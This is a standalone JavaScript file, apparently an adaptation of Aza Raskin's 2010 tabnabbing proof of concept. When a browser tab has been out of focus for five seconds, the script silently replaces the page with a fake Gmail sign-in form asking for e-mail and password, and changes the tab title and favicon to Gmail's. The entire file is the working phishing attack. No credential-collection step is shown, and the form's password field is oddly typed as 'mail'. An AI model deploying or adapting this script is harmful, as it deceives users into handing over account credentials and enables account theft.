/*
Copyright (c) 2010 Aza Raskin
http://azarask.in

Permission is hereby granted, free of charge, to any person
obtaining a copy of this software and associated documentation
files (the "Software"), to deal in the Software without
restriction, including without limitation the rights to use,
copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the
Software is furnished to do so, subject to the following
conditions:

The above copyright notice and this permission notice shall be
included in all copies or substantial portions of the Software.
*/


(function(){
  

    var TIMER = null;
    var HAS_SWITCHED = false;
    
    // Events
    window.onblur = function(){
      TIMER = setTimeout(changeItUp, 5000);
    }  
    
    window.onfocus = function(){
      if(TIMER) clearTimeout(TIMER);
    }
    
    // Utils
    function setTitle(text){ document.title = text; }
    
    // This favicon object rewritten from:
    // Favicon.js - Change favicon dynamically [http://ajaxify.com/run/favicon].
    // Copyright (c) 2008 Michael Mahemoff. Icon updates only work in Firefox and Opera.
    
    favicon = {
      docHead: document.getElementsByTagName("head")[0],
      set: function(url){
        this.addLink(url);
      },
      
      addLink: function(iconURL) {
        var link = document.createElement("link");
        link.type = "image/x-icon";
        link.rel = "shortcut icon";
        link.href = iconURL;
        this.removeLinkIfExists();
        this.docHead.appendChild(link);
      },
    
      removeLinkIfExists: function() {
        var links = this.docHead.getElementsByTagName("link");
        for (var i=0; i<links.length; i++) {
          var link = links[i];
          if (link.type=="image/x-icon" && link.rel=="shortcut icon") {
            this.docHead.removeChild(link);
            return; // Assuming only one match at most.
          }
        }
      },
      
      get: function() {
        var links = this.docHead.getElementsByTagName("link");
        for (var i=0; i<links.length; i++) {
          var link = links[i];
          if (link.type=="image/x-icon" && link.rel=="shortcut icon") {
            return link.href;
          }
        }
      }  
    };  
    
    
    function createShield(){
      document.body.innerHTML = '';
      document.head.innerHTML = '';
      document.head.innerHTML += '<link type="text/css" rel="stylesheet" href="style.css" />'
      document.head.innerHTML += '<link href="https://fonts.googleapis.com/css?family=Open+Sans+Condensed:300" rel="stylesheet" type="text/css">'
      document.head.innerHTML += '<link href="https://fonts.googleapis.com/css?family=Open+Sans:300" rel="stylesheet" type="text/css">'
      document.body.innerHTML += 
      ('\
      <center> \
      <div class = "base"> \
      <div id="logo">\
        <img src="logo.png" width="118" height="38" />\
      </div>\
      <div id="info1">\
        One account. All of Google.\
      </div>\
      <div id="info2">\
        Sign in to continue to Gmail\
      </div>          \
      <div id="form1">\
        <div id="form-img">\
          <img src="profile-img.png" width="99" height="99" />\
        </div>\
        <div id="mailbox">\
          <input placeholder="E-Mail or Phone Number" type="mail" name="name" style="width:270px; height:42px; border: solid 1px #c2c4c6; font-size:16px; padding-left:8px;" />\
        </div>\
        <div id="password">\
          <input placeholder="Password" type="mail" name="name" style="width:270px; height:42px; border: solid 1px #c2c4c6; font-size:16px; padding-left:8px;" />\
        </div>\
        <div>\
          <input type="submit" id="button2" value="Sign in" />\
        </div>\
        <div id = "info3container">\
          <input type="checkbox" id = "cool">Stay signed in</input>\
          <div id="info3">\
            <a href="#">Need help?</a>\
          </div>\
          </div>\
        </div>\
        <div id="info4">\
          <a href="#">Create account</a>\
        </div>\
        <div id="info5">\
          One Google Account for everything Google\
        </div>\
        <div>\
          <img src="footer-logo.png" id="logo2" />\
        </div>\
        <div id="bottom">\
        </div>\
      </div>\
      </center>')
    }
    
    function changeItUp(){
      if( HAS_SWITCHED == false ){
        createShield("https://mail.google.com");
        setTitle( "Gmail: Email from Google");    
        favicon.set("https://mail.google.com/favicon.ico");
        HAS_SWITCHED = true;    
      }
    }
    
    var temp;
      
    })();